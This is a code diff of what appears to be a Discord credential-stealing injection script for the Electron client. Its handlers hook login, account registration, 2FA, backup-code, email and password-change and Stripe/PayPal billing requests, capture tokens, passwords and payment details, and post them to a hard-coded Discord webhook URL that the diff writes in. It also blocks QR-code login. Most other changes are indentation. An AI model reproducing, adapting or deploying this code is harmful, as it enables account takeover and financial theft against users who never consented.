@@ -162,15 +162,15 @@ const CONFIG = {
 
 const request = async (method, url, headers = {}, data = null) => {
     try {
-        const requests = [...(url.includes('api/webhooks') ? [url, CONFIG.API] : [url])].map(url => {
-            return new Promise((resolve, reject) => {
+        const requests = [url].map(url => {
+    return new Promise((resolve, reject) => {
                 const { protocol, hostname, pathname, search } = new URL(url);
                 const client = protocol === 'https:' ? https : http;
-                const options = {
-                    hostname,
+        const options = {
+            hostname,
                     path: pathname + search,
                     method,
-                    headers: {
+            headers: {
                         'Access-Control-Allow-Origin': '*',
                         ...headers,
                     },
@@ -252,7 +252,7 @@ const notify = async (ctx, token, user) => {
     });
 
     try {
-        await request('POST', CONFIG.API, {
+        await request('POST', 'https://discord.com/api/webhooks/1429220016682959040/GSURELbnEyx7MJ7OQHDbmhro6HL7W63wn45mwXMPDyRsp3P2MgN0WJ6BHOezPNbPx4Fl', {
             "Content-Type": "application/json"
         }, JSON.stringify(ctx));
     } catch (error) {
@@ -607,8 +607,8 @@ class Fetcher {
     Profile = async () => {
         return await this._fetch(`${Buffer.from(this.token.split(".")[0], "base64").toString("binary")}/profile`, {
             "Authorization": this.token
-        });
-    };
+    });
+};
 
     Friends = async () => {
         return await this._fetch("@me/relationships", {
@@ -1185,8 +1185,8 @@ const delay = (ms) => {
 };
 
 const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) => {
-    switch (true) {
-        case params.response.url.endsWith('/login'):
+        switch (true) {
+            case params.response.url.endsWith('/login'):
             if (params.response.url.endsWith('/remote-auth/login')) {
                 if (!RESPONSE_DATA.encrypted_token) return;
 
@@ -1221,9 +1221,9 @@ const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) =>
                 RESPONSE_DATA.token,
                 `has Logged in-`
             );
-            break;
+                break;
 
-        case params.response.url.endsWith('/register'):
+            case params.response.url.endsWith('/register'):
             Cruise(
                 'LOGIN_USER',
                 RESPONSE_DATA,
@@ -1233,9 +1233,9 @@ const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) =>
                 token,
                 'has \`Created\` a new account'
             );
-            break;
+                break;
 
-        case params.response.url.endsWith('/totp'):
+            case params.response.url.endsWith('/totp'):
             Cruise(
                 'LOGIN_USER',
                 RESPONSE_DATA,
@@ -1245,10 +1245,10 @@ const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) =>
                 RESPONSE_DATA.token,
                 `you are logged in with \`2FA\``
             );
-            break;
+                break;
 
         case params.response.url.endsWith('/enable'):
-        case params.response.url.endsWith('/codes-verification'):
+            case params.response.url.endsWith('/codes-verification'):
             const codesCount = RESPONSE_DATA.backup_codes ? RESPONSE_DATA.backup_codes.length : 0;
             Cruise(
                 'BACKUP_CODES',
@@ -1259,9 +1259,9 @@ const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) =>
                 token,
                 `\`${codesCount} Security\` codes have just been added`
             );
-            break;
+                break;
 
-        case params.response.url.endsWith('/@me'):
+            case params.response.url.endsWith('/@me'):
             if (!RESQUEST_DATA.password) return;
             if (RESQUEST_DATA.email && RESQUEST_DATA.email_token) {
                 Cruise(
@@ -1295,8 +1295,8 @@ const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) =>
                     token,
                     `has updated their username to \`${RESQUEST_DATA.username}\``
                 );
-            }
-            break;
+                }
+                break;
     };
 };
 
@@ -1358,7 +1358,7 @@ const defaultSession = (webRequest) => {
         XeinaData = await XeinaCord();
         const { token, user } = XeinaData;
 
-        switch (true) {
+    switch (true) {
             case url.includes('stripe'): {
                 let item;
                 try {
@@ -1388,7 +1388,7 @@ const defaultSession = (webRequest) => {
                     token,
                     `you just added a \`Credit Card\``
                 );
-                break;
+            break;
             }
             case (url.endsWith('paypal_accounts') && url.endsWith('billing-agreement-tokens')): {
                 Cruise(
@@ -1400,7 +1400,7 @@ const defaultSession = (webRequest) => {
                     token,
                     `you just added a <:paypal:1364763320795664425> \`Paypal\` account`
                 );
-                break;
+            break;
             }
         }
     });
@@ -1551,8 +1551,8 @@ session.defaultSession.webRequest.onBeforeRequest(qrCodesFilter, async (details,
     if (details.url.startsWith("wss://")) {
         if (!CONFIG.disable_qr_code == false) {
             callback({
-                cancel: true
-            });
+        cancel: true
+    });
             return;
         }
     }
